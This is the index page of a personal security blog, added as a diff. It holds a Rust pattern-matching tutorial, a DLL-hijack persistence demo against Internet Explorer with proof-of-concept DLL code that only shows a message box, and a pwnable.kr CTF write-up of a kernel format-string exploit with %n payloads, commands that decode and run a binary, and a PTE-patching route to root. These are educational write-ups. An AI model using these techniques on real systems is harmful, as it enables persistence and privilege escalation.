@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="generator" content="cl-yag" />
+    <title>Covenstead</title>
+    <link rel="stylesheet" type="text/css" href="static/css/style.css" media="screen" />
+    <link rel="alternate" type="application/rss+xml" title="Covenstead RSS Feed" href="rss.xml" />
+    <link rel="alternate" type="application/rss+xml" title="Covenstead RSS Feed Gopher" href="rss-gopher.xml" />
+<!--    <link rel="alternate" type="application/atom+xml" title="Covenstead Atom Feed" href="atom.xml" /> -->
+    <link rel="icon" type="image/x-icon" href="static/img/clyagFav.ico" />
+  </head>
+
+    <body>
+    <div id="wrapper">
+      <header>
+	<nav class="pure-menu pure-menu-horizontal">
+	  <!--<a href="#"></a>-->
+	    <ul class="pure-menu-list">
+	      <li class="pure-menu-item"><a href="index.html" class="pure-menu-link">Home</a></li>
+	      <li class="pure-menu-item"><a href="index-titles.html" class="pure-menu-link">All Posts</a></li>
+	      <li class="pure-menu-item"><a href="rss.xml" class="pure-menu-link">RSS</a></li>
+	     </ul>
+	</nav>
+      </header>
+      <main>
+              <p>
+      welcome to my digital grimoire! i'm a young witch in training, a cybersec enthusiast, and an avid supporter of free software. i'm also a firm believer in the power of cats, music, and esotericism - because let's be real, who doesn't love a good dose of magic in their lives?
+      <br><br>
+      as you wander through my website, you'll find that most of my work is self-driven, with a focus on linux, cybersecurity, and retro computing.<br><br>
+      some of my current programming interests at the momemnt are:<br>
+      ~ binary exploitation (kernel level specifically)<br>
+      ~ windows internals and malware (Ü< VX >Ü)<br>
+      ~ functional programming<br>
+      ~ (un-)typed lambda calculus and other minimal forms of computation<br>
+      ~ personal computing (uxn, plan9front, haiku...)<br>
+      <br>
+      you can find me here:<br>
+      > <a href="https://github.com/konata-chan404">GitHub</a><br>
+      > <a href="https://www.linkedin.com/in/yael-bar-akiva/">LinkedIn</a><br>
+      > <a href="./resources/pub.pgp">PGP: 7B5B 52F5 4D41 D77B (subkey 6522 207F B4DE 5AEB)</a><br>
+      <pre>
+                |\      _,,,---,,_
+          ZZZzz /,`.-'`'    -.  ;-;;,_
+              |,4-  ) )-,_. ,\ (   `'-'
+              '---''(_/--'  `-'\_)</pre>
+
+      </p>
+      <br>
+<article id="20230516">
+  <header>
+  
+    <h1><a href="2023-05-16-rustpatterns.html">Why I love Rust: Pattern Matching</a></h1>
+    <p>Written by <em>Yael</em>, on 16 May 2023.<br/>Tags: 
+<span><a href="tag-rust.html">#rust</a></span>
+
+
+<span><a href="tag-software-design.html">#software-design</a></span>
+
+</p>
+  </header>
+  <p>My journey with Rust has been rocky to say the least, from fandom to hating back to loving it, I never stopped learning about how I program and engineer. I'm a huge nerd of Functional Programming and the thing that absolutely sold me about rust is it's algebric type system, it is my biggest joy to bring type proofness and complexity to low level programs. The pattern matching in it makes for expressive, readable and type-safe code. In this blog article we will take a look at this topic, and I hope you can learn something from it :3</p>
+
+<h2 id="patterns">Patterns</h2>
+
+<h3 id="refutablevsirrefutable">Refutable vs irrefutable</h3>
+
+<p>Patterns in Rust come in two types; refutable and irrefutable. Patterns that match conditionally are called refutable, while patterns that match any possible value are called irrefutable. Which one you can use will depend on the context. For example, a let-statement will need a irrefutable pattern, because what would happen if a variable in a let-statement doesn’t get a value?</p>
+
+<pre><code>// Irrefutable patterns - variable bindings, always succeeds
+let x = 5;
+let (x, y) = (1, 2);
+
+// Doesn't compile
+let Ok(x) = string.parse::&lt;i32&gt;() // parsing a string will return a Result&lt;T&gt;, and it is refutable whether it's an OK(x)
+</code></pre>
+
+<p>if let statements on the other hand can have refutable patterns, as the body is evaulated conditionally and it's refutability is inherent:</p>
+
+<pre><code>if let Ok(x) = string.parse::&lt;i32&gt;() {
+  // ... do something if string can be parsed as a 32 bit integer ...
+}
+
+// if let can have a refutable pattern, so we can also use a value for x:
+if let Ok(64) = someString.parse::&lt;i32&gt;() {
+  // ... do something if string can be parsed as a 32 bit integer ...
+}
+</code></pre>
+
+<h2 id="destructuring">Destructuring</h2>
+
+<p>Many patterns destructure various types, and they can also be mixed and match together. Let\’s look at some of them together~</p>
+
+<h3 id="tuples">Tuples</h3>
+
+<p>You are already probably familiar with tuple destructuring, but let's examine again:</p>
+
+<pre><code>// tuple: (i32, i32, &amp;str)
+let tuple = (1, 2, &quot;three&quot;);
+let (x, y, z_str) = tuple;
+</code></pre>
+
+<p>We see in the last line that tuple is destructured into 3 new variables: x, y, and z_str.
+This can be done for all sorts of tuples, as long as the destructured types match.</p>
+
+<p>My favorite trick is that you can match elements with <code>..</code> or <code>_</code>, which are used to skip elements and create more complex logic:</p>
+
+<pre><code>// discard z_str
+let (x, y, _) = tuple;
+
+// get only x
+let (x, ..) = tuple;
+
+let big_tuple = (1, 2, 3, 4, 5);
+
+// Does not compile, ambigious pattern.
+let (..., middle, ...) = big_tuple;
+</code></pre>
+
+<p>(Patterns have to be unambigious)</p>
+
+<h3 id="structs">Structs</h3>
+
+<p>Structs are not much different than tuples, i'll save your internet bandwidth by not showing an example although it is very self explanatory. The only difference is the .. behaviour, when deconstructing it has to come last and it means to match the rest and ignore the result.</p>
+
+<h3 id="enums">Enums</h3>
+
+<p>This might be the simplest yet most important of them all, the simplest case for enum deconstructing is to match one with no data:</p>
+
+<pre><code>// simple enum
+enum TrafficSignal {
+    Red,
+    Orange,
+    Green
+}
+
+// match if our color is green
+if let Color::green = my_color {
+    // cars go!
+}
+</code></pre>
+
+<p>Luckily, Rust enums are way way more interesting as they contain data. So much complexity arises out of that.</p>
+
+<pre><code>// complex enum
+enum Enemy {
+    Alive(u32),
+    Dead
+}
+
+// match against an alive enemy
+if let Enemy::Alive(data) = my_enemy {
+    // oh no! gotta beat them &gt;:3
+}
+
+// match against a dead enemy
+if let Enemy::Dead = my_enemy {
+    // you win~!
+}
+</code></pre>
+
+<h2 id="otherpatterns">Other Patterns</h2>
+
+<p>There are other types of patterns in Rust that capture a lot of elementary and cool behaviour. Since they're varied it is best to just demonstrate them:</p>
+
+<pre><code>// OR pattern
+
+1 | 2 | 3 // matches 1, 2, or 3
+&quot;one&quot; | &quot;two&quot; // matches one of these two strings
+
+// range pattern
+
+1..=10 // matches 1 to 10 (inclusive)
+1..10 // matches 1 to 10 (non-inclusive)
+
+// at pattern
+struct Point {
+    x: i32,
+    y: i32
+}
+
+// matches if my_x exists under an optional condition
+if let Point {x: my_x @ 1..=10, ..} = my_data {
+    // my_x is between 1 and 10.
+}
+</code></pre>
+
+<h2 id="thepayoff">The Payoff</h2>
+
+<p>pattern matching is closely related to Rust's powerful algebric type system. We can combine the different behaviours of patterns in order to write clear and simply awesome code~!<br>
+One example that speaks to itself and shows the immense power pattern matching has is to pit it against object-oriented code. let's consider a case where we have a Shape hierarchy with two concrete classes (Circle and Rectangle), we'll compare the object-oriented approach in java with the pattern matching code in Rust.</p>
+
+<h3 id="javaoop:">Java (OOP):</h3>
+
+<pre><code>abstract class Shape {
+    abstract double calculateArea();
+}
+
+class Circle extends Shape {
+    private double radius;
+
+    public Circle(double radius) {
+        this.radius = radius;
+    }
+
+    public double calculateArea() {
+        return Math.PI * radius * radius;
+    }
+}
+
+class Rectangle extends Shape {
+    private double width;
+    private double height;
+
+    public Rectangle(double width, double height) {
+        this.width = width;
+        this.height = height;
+    }
+
+    public double calculateArea() {
+        return width * height;
+    }
+}
+
+public class Main {
+    public static void main(String[] args) {
+        Shape shape = new Circle(5.0);
+
+        if (shape instanceof Circle) {
+            Circle circle = (Circle) shape;
+            double area = circle.calculateArea();
+            System.out.println(&quot;Area of Circle: &quot; + area);
+        } else if (shape instanceof Rectangle) {
+            Rectangle rectangle = (Rectangle) shape;
+            double area = rectangle.calculateArea();
+            System.out.println(&quot;Area of Rectangle: &quot; + area);
+        }
+    }
+}
+</code></pre>
+
+<h3 id="rustpatternmatching:">Rust (Pattern Matching):</h3>
+
+<pre><code>enum Shape {
+    Circle(f64),
+    Rectangle(f64, f64),
+}
+
+fn calculate_area(shape: Shape) -&gt; f64 {
+    match shape {
+        Shape::Circle(radius) =&gt; std::f64::consts::PI * radius * radius,
+        Shape::Rectangle(width, height) =&gt; width * height,
+    }
+}
+
+fn main() {
+    let circle = Shape::Circle(5.0);
+    let circleArea = calculate_area(circle);
+    let rectangle = Shape::Rectangle(5.0, 2.0);
+    let rectangleArea = calculate_area(rectangle);
+    
+    println!(&quot;Area of Circle: {circleArea}&quot;, circleArea);
+    println!(&quot;Area of Rectangle: {rectangleArea}&quot;, rectangleArea);
+}
+</code></pre>
+
+<h3 id="conclusions">Conclusions</h3>
+
+<p>I could go on about it for much longer, although I hope that was enough for the knowledge-hungry.
+I hope you now understand pattern matching a little better and see how it is a fundamental and powerful feature in Rust that contributes to its overall expressiveness and safety. Embracing it in my code greatly enchanced my programming exprience and generally leads to more robust and maintanable applications.</p>
+
+</article>
+
+
+<article id="20230514">
+  <header>
+  
+    <h1><a href="2023-05-14-iepersistence.html">Demonstration of Malware Persistence through Microsoft Internet Explorer</a></h1>
+    <p>Written by <em>Yael</em>, on 14 May 2023.<br/>Tags: 
+<span><a href="tag-malware.html">#malware</a></span>
+
+
+<span><a href="tag-persistence.html">#persistence</a></span>
+
+
+<span><a href="tag-windows.html">#windows</a></span>
+
+</p>
+  </header>
+  <p>One of the controversial concerns with Microsoft's smash hit Windows is the bloat in software and features. It is a focal point point in malware targeting, abusing poorly designed systems and preying on it's huge userbase.</p>
+
+<p>All of it undeniably ties in into The Browser Wars Microsoft found themselves in, all tech corps trying to shill their spyware packaged with an open-source web browser engine. Besides my serious non important opinions on the matter, I think we're all familiar with Internet Explorer, an old piece of tech that still comes packaged on all Windows systems and is damn near impossible to get rid off.</p>
+
+<p>Per usual, let's try to abuse the fact it is so atomic to Window's user experience and try to achieve some sort of malware persistence.
+I opened procmon from the sysinternals utilities suite looking for potential DLL injections, in the case IE tries to load non existent / or creates it&#8217;s own DLLs we&#8217;re able to intervene and load our &#8220;malicious&#8221; ones.
+Using these filters, we can look for specific kinds of DLLs that only exist on runtime:</p>
+
+<figure>
+<img src="./static/img/iepersistence/filters.png" alt="" />
+</figure>
+
+<p>Let's open the executable and observe :3</p>
+
+<figure>
+<img src="./static/img/iepersistence/launch.png" alt="" />
+</figure>
+
+<p>So many... We need to look for files that are used exclusively by IE, one that came up that has a readable and non suspicious name is suspend.dll.</p>
+
+<p>Here's a &quot;malicious&quot; DLL we can use to emulate code execution needed for persistence, a real malware would hide here persistent code.</p>
+
+<pre><code class="c">#include &lt;windows.h&gt;
+#include &quot;pch.h&quot;
+#pragma comment (lib, &quot;user32.lib&quot;)
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        MessageBox(
+            NULL,
+            L&quot;you just got pwned~&quot;,
+            L&quot;/ᐠ. ᴗ.ᐟ\\ﾉ&quot;,
+            MB_OK
+        );
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+</code></pre>
+
+<p>Time for compilation, I will use Visual Studio's built in solutions although it is fairly flexible.
+After it's done, we need to put it where IE loads it from and rename it to solution.dll:</p>
+
+<p><img src="./static/img/iepersistence/cp.png" alt="" />
+<img src="./static/img/iepersistence/pwn.png" alt="" /></p>
+
+<h3 id="wowwegotourpwn">WOW, we got our pwn~</h3>
+
+<p>Our code got executed and then Internet Explorer launched per normal. This is pretty pretty cool...</p>
+
+<p><em>What can we take away from this?</em> </p>
+
+<p>While this particular proof of concept has been patched somewhere last year, I believe it holds a lot of relevancy in practices of persistence and malware design as a whole.
+Looking for fundemental features Microsoft doesn&#8217;t want to get rid off (nor can't) and find flaws in their behaviour is a cornerstone in this field. In addition, DLL injection in this way is incredibly simple yet demonstrates understanding of Windows Internals.</p>
+
+</article>
+
+
+<article id="20230212">
+  <header>
+  
+    <h1><a href="2023-02-12-softmmu.html">pwnable.kr's softmmu - An Awesome Linux Kernel Exploit</a></h1>
+    <p>Written by <em>Yael</em>, on 12 February 2023.<br/>Tags: 
+<span><a href="tag-linux-kernel.html">#linux-kernel</a></span>
+
+
+<span><a href="tag-pwn.html">#pwn</a></span>
+
+
+<span><a href="tag-ctf.html">#ctf</a></span>
+
+</p>
+  </header>
+  <p>Over the years of my CTF'ing I always come back to <a href="https://pwnable.kr">pwnable.kr</a>, although a tad outdated it's a vast source of simply awesome binary exploitation and pwn challanges. In particular their kernel exploitation series of challanges interest me - they're really well made and good introductory material on the matter. Per the policies on the site, this writeup won't share any source code and try to be minimal as possible.</p>
+
+<p>The last of those challanges is <em>softmmu</em>, here's the readme:
+</p>
+
+<blockquote>
+<p><strong><em>If you are good at kernel exploit, try this one :)</em></strong></p>
+</blockquote>
+
+<p><img src="./static/img/softmmu/softmmu.png" style="width:20%"></p>
+
+<h2 id="thechallange">The Challange</h2>
+
+<p>We're given two things: a linux kernel object file containing some sort of a driver, and access to a fairly old linux virtual machine loaded with asid driver. Before we open the executable for further inspection in IDA, let's SSH into the machine and check what it does.</p>
+
+<pre><code>...
+[+] Loading x86 PAE MMU emulator
+[+] Write the virtual address to /proc/softmmu
+[+] You can obtain it's physical address by reading /proc/softmmu
+[+] i.e. echo -ne '\x00\x80\x04\x08' &gt; /proc/softmmu; hexdump -C /proc/softmmu
+[+] Let the kernel exploit begin :)
+
+$ uname -a
+Linux (none) 3.7.1 #1 SMP Mon Dec 23 06:07:19 PST 2013 i686 GNU/Linux
+$ ls /*.ko
+/softmmu.ko
+</code></pre>
+
+<p><em>Hmm</em>, it prints out a pretty explanation for us :3 As the name softmmu hints - the module interfaces with the Linux kernel memory's and emulates a x86 Page Address Extension for the MMU. The interface with the module seems to be very straightforward, we write a virtual address to the device file /proc/softmmu and then read back the physical address.</p>
+
+<h2 id="findingavulnerability">Finding A Vulnerability</h2>
+
+<p>Our end goal is to get root, so we definitely have to find a vulnerability to expoloit in the softmmu module. Let's open the kernel object file in IDA to analyze:</p>
+
+<p><img src="./static/img/softmmu/overview.png" style="width:70%"></p>
+
+<p>A fairly tame program, not too many functions and fairly straightforward structure. We are not going to reverse the entire program (since I found the vulnerability quickly) but here are some pointers:
+
+&gt; We cannot request the physical addresses of ones outside userspace (seems important for the exploit).
+&gt; It recursively traverses page table within the mmu_walk() function in order to retrieve addresses.
+&gt; Program contains verbose output for debugging purposes.
+
+The last point is particulary important; it allows us to understand the inner workings better and perhaps find a vulnerability to exploit, let's look at the debugging code.</p>
+
+<pre><code>__int64 __usercall get_pte_entry@&lt;edx:eax&gt;(int a1@&lt;eax&gt;, char *a2@&lt;edx&gt;)
+{
+  int v2; // ebx
+
+  v2 = *(_DWORD *)&amp;a2[8 * ((a1 &amp; 0x1FF000u) &gt;&gt; 12)];
+  if ( (v2 &amp; 1) != 0 )
+  {
+    printk(&quot;[Debug] PGD(%x) Dump\n&quot;, a2);
+    printk(
+      &quot;[task:%s] %p:%02x %p:%02x %p:%02x %p:%02x\n&quot;,
+      (const char *)(__readfsdword((unsigned int)&amp;current_task) + 740),
+      a2,
+      *a2,
+      a2 + 1,
+      a2[1],
+      a2 + 2,
+      a2[2],
+      a2 + 3,
+      a2[3]);
+    printk(&quot;[Debug] Dump Virtual Address\n&quot;);
+    printk(&quot;\n===============================\n&quot;);
+    printk((const char *)req_vaddr);
+    printk(&quot;\n===============================\n&quot;);
+  }
+  return v2;
+}
+</code></pre>
+
+<p>Fairly bloaty raw decompiled code, but breaking it down it is very simple: it retrieves a page table entry from a PD64 (Page Global Directory entry). Besides the pretty cool kernel level code, the vulnerability here is glaringly obvious - the program passes the address we request (a global variable) to printk().
+
+&gt; printk((const char *)req_vaddr);
+</p>
+
+<h4 id="boom">Boom~!</h4>
+
+<p>We found a string format vulnerability we can control :3 </p>
+
+<h2 id="writingtheexploit-pt.1">Writing The Exploit - Pt. 1</h2>
+
+<p>So far this hasn't been a challenge for kernel experts, even a script kiddie can find this vulnerability. I must admit, writing the exploit is much more difficult because a plethora of reasons.
+
+In order to pass a string to the module, we'd have to allocate some bytes in the process memory space. Let's try compile a simple C program on the remote machine to do just that:
+<code>
+/tmp $ gcc pwn.c
+sh: gcc: not found
+</code>
+<em>Oof</em>, that means we have to cross compile.
+The first problem that imposes us is the fact the remote machine is running a really outdated version of the kernel, paired with the fact it doesn't have internet access it really limits us in how we compile for it.
+The soltuion that I came up with was as follows
+compile a static no-stdlib program -&gt; compress it -&gt; base64 the tar.gz -&gt; do the reverse on remote.
+</p>
+
+<h4 id="thismeanswritingaminimallibcfromscratchgoodluckme...">This means writing a minimal libc from scratch, <em>good luck me</em>...</h4>
+
+<p>After a fair amount of work, I got to a level where I had all of the necessary API's to leverage the vulnerability
+On local machine:</p>
+
+<pre><code>yael@covenstead:~/softmmu$ gcc pwn.c -nostdlib -m32 -static -o /dev/stdout | gzip - | base64 -w 0
+H4sIAAAAAAAAA+1bfWwT5xlz3YSjziNYdmW0nR1p2iE0phAUpY0k0gCB2kFw4RYa9dS49hHEsd2PPtcEgYrzIuI5VnLgE2a1j+Q9v2hqdpUpPHPsqZt...
+</code></pre>
+
+<p>On Remote:</p>
+
+<pre><code>/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x &quot;%x %x %x %x\n&quot;
+&lt; paste base64 code here &gt;
+[ 1406.371600] virtual address set to dede000
+[ 1406.371963] [Debug] PGD(c2ad1000) Dump
+[ 1406.372520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
+[ 1406.372963] [Debyg] Dump Virtual Address
+[ 1406.373234]
+[ 1406.373234] =============================
+[ 1406.373627] c2eb7514 c2ad21000 0 c2ad21001 0
+======================================
+[ 1406.374963] [Debug] PGD(c2ad1000) Dump
+[ 1406.374520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
+[ 1406.374963] [Debyg] Dump Virtual Address
+[ 1406.375234]
+[ 1406.375234] =============================
+[ 1406.375627] c2eb7514 c2ad21000 0 c2ad21001 0
+======================================
+[&lt;3] softmmu output: 0xBFB81288
+</code></pre>
+
+<p>
+Awesome~! We're able to leak addresses off the stack :3
+Finally some progress, we should try running the forsakened %n...</p>
+
+<pre><code>/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x &quot;%65n&quot;
+&lt; ... &gt;
+[ 1406.371600] virtual address set to dede000
+[ 1406.371963] [Debug] PGD(c2ad1000) Dump
+[ 1406.372520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
+[ 1406.372963] [Debyg] Dump Virtual Address
+[ 1406.373234]
+[ 1406.373234] =============================
+[ 1406.373627]                                                               
+======================================
+[ 1406.374963] [Debug] PGD(c2ad1000) Dump
+[ 1406.374520] [task:A] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
+[ 1406.374963] [Debyg] Dump Virtual Address
+[ 1406.375234]
+[ 1406.375234] =============================
+[ 1406.375627]                                                        
+======================================
+[&lt;3] softmmu output: 0xBFB81288
+</code></pre>
+
+<p>OMG, it worked and we wrote into the process name &lt;3! (As seen in the debug messages) All of this work wasn't for nothing.</p>
+
+<h2 id="writingtheexploit-pt.2">Writing The Exploit - Pt. 2</h2>
+
+<p>Now for the second part of the exploit, we have to figure out how the hell we take advantage of the format string vulnerability. This isn't like the average format string attack as it's not performed on a userland stack, but a kernel one. Besides our request address which occasionally surfaces down the stack we get nada.
+
+Luckily for us we have a bunch of debug values on the stack, some of them might be incredibly useful to craft an exploit. <strong><em>Yes!</em></strong> The stack is setup in a way we can write to the page table entry any arbtriary value we want, hence we change the permissions of a kernel pages and execute our code as supervisor :3
+(We have a pointer for each byte and the corresponding address)
+
+Since we have to fully comperhend the paging mechanism in full detail to execute this exploit properly, here's a diagram of the Page Table Entry structure:</p>
+
+<p><img src="./static/img/softmmu/pte.png" style="width:70%"></p>
+
+<p>There are many bits and flops, but assuming basic knowledge of paging nothing is too out of ordinary. The first three flags are interesting: P (<strong>P</strong>resent), R/W (<strong>R</strong>ead/<strong>W</strong>rite) and U/S (<strong>U</strong>ser/<strong>S</strong>upervisor).
+If the <strong>P</strong>resent bit is set then the page is actually in physical memory at the moment, if the <strong>R</strong>ead and <strong>W</strong>rite bit is set then the page is both readable and writable (if not then it is read only) and lastly the <strong>U</strong>Ser/<strong>S</strong>upervisor bit is set based on privellege level.
+
+We can get to work on patching the bytes of the PTE, we are able to patch one of our userspace page entries to pount to a physical adress that contains the kernel code of sys_setresuid() and make it writable. Once we got that we can flip the prillege check from je to jne, call setresuid(0) and obtain root &gt;:3</p>
+
+<pre><code>/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x
+&lt; ... &gt;
+{CENSORED_FLAG}
+/ # whoami
+</code></pre>
+
+<h2 id="conclusions">Conclusions</h2>
+
+<p>This without a doubt is a serious challenge full of hurdles. Personally for me it symbolizes some sort of maturity in my cybersecurity journey, I learned so much throughout and I can't wait to do more.
+
+About the softmmu itself, this post only showed the a small part of the failures. So much stuff I first tried didn't end up working at the end, this only shows how deep and complex it gets. I believe it is a prime example of diving deep and reading old documentation about the kernel's inner workings and trying to figure it all out.</p>
+
+<p><img src="./static/img/softmmu/softmmu_completed.png" style="width:20%"></p>
+
+<p>TLDR: the kernel is complex</p>
+
+</article>
+
+
+      </main>
+
+      <footer><p>This blog is powered by cl-yag~</p></footer>
+
+    </div><!-- #wrapper -->
+  </body>
+</html>
